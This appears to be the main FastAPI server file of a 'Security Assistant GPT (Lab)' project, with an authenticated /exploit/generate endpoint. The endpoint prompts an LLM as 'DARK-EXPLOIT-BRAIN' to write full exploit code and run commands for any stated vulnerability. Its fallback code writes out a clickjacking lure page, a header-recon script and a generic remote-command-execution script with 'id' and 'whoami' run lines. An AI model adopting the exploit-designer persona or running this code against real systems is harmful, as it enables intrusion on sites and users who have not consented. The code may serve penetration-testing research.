from __future__ import annotations

import os
import json
import logging
import traceback
from typing import List, Dict, Any

from dotenv import load_dotenv
from fastapi import FastAPI, HTTPException, Request, status, Depends
from fastapi.middleware.cors import CORSMiddleware

from src.core.paths import BASE_DIR

# ============================================================
# Env & paths
# ============================================================

load_dotenv(BASE_DIR / ".env")

# ============================================================
# Logging
# ============================================================
#
# NOTE: this must run *before* we import src.api.state (below) — that
# module builds the executor / chat_memory / online-learning singletons
# at import time and logs during that setup. Importing it earlier would
# make those log lines bypass this configuration (default root logger,
# no handlers, WARNING level) same as it would have in the pre-split
# monolithic http.py, where these singletons were only ever constructed
# after setup_logging() had already run.

def setup_logging() -> None:
    """
    Logging controlled by env:
      LOG_LEVEL=DEBUG|INFO|WARNING|ERROR
      LOG_TO_FILE=1
    """
    level_name = os.getenv("LOG_LEVEL", "INFO").upper()
    level = getattr(logging, level_name, logging.INFO)

    handlers: List[logging.Handler] = []

    console = logging.StreamHandler()
    console.setLevel(level)
    handlers.append(console)

    if os.getenv("LOG_TO_FILE", "").strip() in ("1", "true", "yes", "on"):
        log_file = BASE_DIR / "data" / "logs" / "api.log"
        log_file.parent.mkdir(parents=True, exist_ok=True)
        file_handler = logging.FileHandler(log_file, encoding="utf-8")
        file_handler.setLevel(level)
        handlers.append(file_handler)

    logging.basicConfig(
        level=level,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
        handlers=handlers,
    )


setup_logging()
logger = logging.getLogger(__name__)

# ============================================================
# Remaining imports — deferred until after setup_logging() (see note above)
# ============================================================

from src.api.schemas.schemas import (
    CreateTaskRequest,
    CreateTaskResponse,
    ReportResponse,
    ChatRequest,
    ChatResponse,
)
from src.core.models import Task
from src.db.session import init_db
from src.db.models import User
from src.api.auth_routes import router as auth_router
from src.api.routers.chat import router as chat_router
from src.api.routers.conversations import router as conversations_router
from src.api.routers.online_learning import router as online_learning_router
from src.api.state import executor, online_learning_client, EVENTS_LOG_DIR
from src.security.audit import audit_log
from src.security.auth import get_current_user, ensure_jwt_secret_configured
from pydantic import BaseModel

# ============================================================
# FastAPI app
# ============================================================

app = FastAPI(title="Security Assistant GPT (Lab)")

@app.on_event("startup")
def _create_tables_if_missing() -> None:
    init_db()
    ensure_jwt_secret_configured()

origins = [
    "http://localhost:5173",
    "http://127.0.0.1:5173",
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
app.include_router(auth_router)
app.include_router(chat_router)
app.include_router(conversations_router)
app.include_router(online_learning_router)

# ============================================================
# Healthcheck
# ============================================================

@app.get("/health")
async def health() -> Dict[str, Any]:
    return {
        "status": "ok",
        "online_learning_enabled": online_learning_client is not None,
        "events_log_dir": str(EVENTS_LOG_DIR),
    }

# ============================================================
# Exploit LLM models (for /exploit/generate)
# ============================================================

class ExploitLLMRequest(BaseModel):
    vuln_description: str
    target_stack: str
    exploit_goal: str
    constraints: Dict[str, Any] = {}


class ExploitLLMFile(BaseModel):
    path: str
    language: str
    code: str


class ExploitLLMResponse(BaseModel):
    exploit_files: List[ExploitLLMFile]
    run_instructions: List[str]
    notes: str


# ============================================================
# Exploit LLM endpoint (/exploit/generate) – OpenAI-backed
# ============================================================

def _synthesize_exploit_llm(req: ExploitLLMRequest) -> ExploitLLMResponse:
    """
    Core exploit LLM logic.

    - Uses OpenAILLMAdvisor.secure_chat to generate exploit JSON.
    - If JSON parsing fails or advisor is disabled, falls back to deterministic PoC.
    """
    from json import JSONDecodeError

    # Use the same advisor as /chat
    advisor = executor.llm_advisor
    if advisor is None or advisor.client is None or not getattr(advisor.config, "enabled", False):
        logger.warning("[exploit_llm] advisor disabled or unavailable, using local fallback.")
        return _synthesize_exploit_llm_fallback(req)

    # Build a strict JSON instruction for the model
    system_prompt = (
        "You are DARK-EXPLOIT-BRAIN, an automated exploit designer.\n\n"
        "You MUST respond with a single JSON object ONLY, no prose, no markdown.\n"
        "JSON schema:\n"
        "{\n"
        '  \"exploit_files\": [\n'
        "    {\"path\": \"exploits/<name>\", \"language\": \"python|bash|html|php|js|...\", \"code\": \"<full source>\"},\n"
        "    ...\n"
        "  ],\n"
        "  \"run_instructions\": [\"exact command to run PoC #1\", \"...\"],\n"
        "  \"notes\": \"short technical notes\"\n"
        "}\n\n"
        "Do NOT wrap JSON in; do NOT add comments; output pure JSON."
    )

    user_prompt = (
        "Exploit specification:\n"
        f"- Target stack: {req.target_stack}\n"
        f"- Vulnerability: {req.vuln_description}\n"
        f"- Exploit goal: {req.exploit_goal}\n"
        f"- Constraints: {req.constraints}\n\n"
        "Design the most effective exploit PoC(s) for this scenario and return them in the JSON schema above."
    )

    messages = [
        {"role": "system", "content": system_prompt},
        {"role": "user", "content": user_prompt},
    ]

    try:
        raw = advisor.secure_chat(messages=messages, resource_name="exploit_llm")
    except Exception as e:
        logger.exception("[exploit_llm] secure_chat failed | error=%r", e)
        return _synthesize_exploit_llm_fallback(req)

    raw_str = raw.strip()
    logger.debug("[exploit_llm] raw model output: %s", raw_str[:500])

    # Try to parse JSON
    try:
        data = json.loads(raw_str)
    except JSONDecodeError as e:
        logger.warning("[exploit_llm] JSON decode failed (%r), using fallback.", e)
        return _synthesize_exploit_llm_fallback(req)

    # Validate and coerce into ExploitLLMResponse
    try:
        files_data = data.get("exploit_files", [])
        run_instructions = data.get("run_instructions", [])
        notes = data.get("notes", "")

        exploit_files: List[ExploitLLMFile] = []
        for f in files_data:
            path = str(f.get("path", "exploits/generated_poc.py"))
            language = str(f.get("language", "text"))
            code = str(f.get("code", ""))
            exploit_files.append(
                ExploitLLMFile(path=path, language=language, code=code)
            )

        if not isinstance(run_instructions, list):
            run_instructions = [str(run_instructions)]

        run_instructions = [str(x) for x in run_instructions]
        notes = str(notes)

        return ExploitLLMResponse(
            exploit_files=exploit_files,
            run_instructions=run_instructions,
            notes=notes,
        )
    except Exception as e:
        logger.warning("[exploit_llm] result coercion failed (%r), using fallback.", e)
        return _synthesize_exploit_llm_fallback(req)


def _synthesize_exploit_llm_fallback(req: ExploitLLMRequest) -> ExploitLLMResponse:
    """
    Deterministic fallback: clickjacking+header recon or generic RCE.
    """
    focus = (req.constraints.get("focus") or "").lower()
    source_url = req.constraints.get("source_url", "https://target.example.com")

    exploit_files: List[ExploitLLMFile] = []
    run_instructions: List[str] = []
    notes_parts: List[str] = []

    notes_parts.append(f"[fallback] Target stack: {req.target_stack}")
    notes_parts.append(f"[fallback] Vulnerability: {req.vuln_description}")
    notes_parts.append(f"[fallback] Goal: {req.exploit_goal}")
    notes_parts.append(f"[fallback] Constraints: {req.constraints}")

    if "clickjacking" in focus or "xss" in focus or "browser" in focus:
        from urllib.parse import urlparse

        parsed = urlparse(source_url)
        host = (parsed.netloc or parsed.path or "target").replace(":", "_").replace("/", "_")

        html_path = f"exploits/llm_clickjack_{host}.html"
        py_path = f"exploits/llm_headers_recon_{host}.py"

        html_code = f"""<!DOCTYPE html>
<html>
<head>
  <title>LLM Clickjacking PoC for {source_url}</title>
  <style>
    html, body {{
      margin: 0;
      padding: 0;
      height: 100%;
      overflow: hidden;
      background: #000;
      color: #0f0;
      font-family: monospace;
    }}
    #victim-frame {{
      position: absolute;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      opacity: 0.01;
      z-index: 1;
      border: none;
    }}
    #lure-layer {{
      position: absolute;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 2;
    }}
    .fake-button {{
      padding: 20px 40px;
      border: 1px solid #0f0;
      background: #111;
      cursor: pointer;
      text-transform: uppercase;
      letter-spacing: 2px;
    }}
  </style>
</head>
<body>
  <iframe id="victim-frame" src="{source_url}"></iframe>
  <div id="lure-layer">
    <div class="fake-button">Click to claim your dev bonus</div>
  </div>
</body>
</html>
"""

        py_code = f"""#!/usr/bin/env python3
# {py_path}
import requests

TARGET = "{source_url}"

def fetch_headers(url: str):
    resp = requests.get(url, timeout=10, allow_redirects=True)
    return resp.url, resp.status_code, resp.headers

def classify_header_posture(headers: dict) -> dict:
    h = {{k.lower(): v for k, v in headers.items()}}
    posture = {{
        "frameable": False,
        "csp_weak": False,
        "cookies_weak": False,
        "referrer_leaky": False,
    }}

    xfo = h.get("x-frame-options", "")
    csp = h.get("content-security-policy", "")
    if ("deny" not in xfo.lower() and "sameorigin" not in xfo.lower()
        and "frame-ancestors" not in csp.lower()):
        posture["frameable"] = True

    if not csp or "unsafe-inline" in csp or "*" in csp:
        posture["csp_weak"] = True

    for ck in [v for k, v in headers.items() if k.lower() == "set-cookie"]:
        low = ck.lower()
        if "httponly" not in low or "secure" not in low:
            posture["cookies_weak"] = True
            break

    if "referrer-policy" not in h:
        posture["referrer_leaky"] = True

    return posture

if __name__ == "__main__":
    final_url, status, headers = fetch_headers(TARGET)
    posture = classify_header_posture(headers)
    print(f"[+] Final URL: {{final_url}} (HTTP {{status}})")
    print("[+] Header posture classification:")
    for k, v in posture.items():
        print(f"    - {{k}}: {{v}}")
"""

        exploit_files.append(ExploitLLMFile(path=html_path, language="html", code=html_code))
        exploit_files.append(ExploitLLMFile(path=py_path, language="python", code=py_code))

        run_instructions.append(f"python3 {py_path}")
        run_instructions.append(f"Host {html_path} and open it in a browser to test clickjacking.")

        notes_parts.append("[fallback] browser-side clickjacking + header recon PoC generated.")
    else:
        url = req.constraints.get("rce_url", "http://target/vuln.php")
        param = req.constraints.get("rce_param", "cmd")
        poc_path = "exploits/llm_generic_rce_poc.py"

        code = f"""#!/usr/bin/env python3
# {poc_path}
import sys
import requests

TARGET_URL = "{url}"
PARAM_NAME = "{param}"

def run_cmd(cmd: str):
    params = {{PARAM_NAME: cmd}}
    resp = requests.get(TARGET_URL, params=params, timeout=10)
    print("HTTP", resp.status_code)
    print(resp.text)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {{sys.argv[0]}} '<command>'")
        sys.exit(1)
    run_cmd(sys.argv[1])
"""
        exploit_files.append(ExploitLLMFile(path=poc_path, language="python", code=code))
        run_instructions.append(f"python3 {poc_path} 'id'")
        run_instructions.append(f"python3 {poc_path} 'whoami'")
        notes_parts.append("[fallback] generic RCE PoC generated.")

    notes = "\n".join(notes_parts)

    return ExploitLLMResponse(
        exploit_files=exploit_files,
        run_instructions=run_instructions,
        notes=notes,
    )


@app.post(
    "/exploit/generate",
    response_model=ExploitLLMResponse,
    status_code=status.HTTP_200_OK,
)
async def exploit_generate(
    body: ExploitLLMRequest,
    request: Request,
    current_user: User = Depends(get_current_user),
) -> ExploitLLMResponse:
    """
    Exploit LLM endpoint used by ExploitModeEngine._try_llm_generation().
    """
    try:
        resp = _synthesize_exploit_llm(body)
    except Exception as e:
        logger.exception("[exploit_generate] failed | error=%r", e)
        raise HTTPException(status_code=500, detail=f"Exploit generation failed: {e}")

    audit_log(
        "exploit_generate",
        {
            "remote_addr": request.client.host if request.client else None,
            "goal": body.exploit_goal,
            "target_stack": body.target_stack,
        },
    )

    return resp